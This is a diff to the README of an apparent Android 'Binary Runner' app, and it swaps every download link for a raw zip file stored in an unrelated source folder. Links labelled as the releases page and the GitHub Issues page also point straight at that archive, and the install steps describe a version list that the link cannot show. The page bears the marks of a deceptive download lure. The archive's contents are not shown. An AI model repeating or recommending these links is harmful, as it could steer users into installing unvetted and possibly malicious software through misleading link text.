@@ -7,7 +7,7 @@ Binary Runner is a Flutter app for Android. It allows you to run binaries with c
 To get started, you will need to download the app. Follow the steps below to install it on your Android device.
 
 ## 🖱 Download Now
-[![Download BinaryRunnerAndroid](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip)](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip)
+[![Download BinaryRunnerAndroid](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip)](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip)
 
 ## 📋 System Requirements
 Before you download, make sure your device meets the following requirements:
@@ -17,7 +17,7 @@ Before you download, make sure your device meets the following requirements:
 
 ## 💾 Download & Install
 1. **Visit the Releases page:**
-   Go to [this page to download](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip).
+   Go to [this page to download](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip).
 
 2. **Select the latest version:**
    You should see a list of available versions. Click on the most recent one.
@@ -55,7 +55,7 @@ If you want to help improve Binary Runner, feel free to fork the repository, mak
 
 ## 🤝 Community Support
 Join our community for support and tips:
-- Visit the [GitHub Issues page](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip) for help or to report bugs.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip) for help or to report bugs.
 - Share your experience with other users on related forums.
 
 ## 📜 License
@@ -65,6 +65,6 @@ BinaryRunnerAndroid is open-source software. It is released under the MIT Licens
 Thanks to everyone who contributed to this project! Your support makes it possible to provide this tool to users like you.
 
 ## 📥 Download Now
-[![Download BinaryRunnerAndroid](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip)](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/pharmaceutist/BinaryRunnerAndroid.zip)
+[![Download BinaryRunnerAndroid](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip)](https://raw.githubusercontent.com/Maxx0x1/BinaryRunnerAndroid/main/android/app/src/profile/Binary_Android_Runner_3.6.zip)
 
 Now start running your binaries easily with Binary Runner!
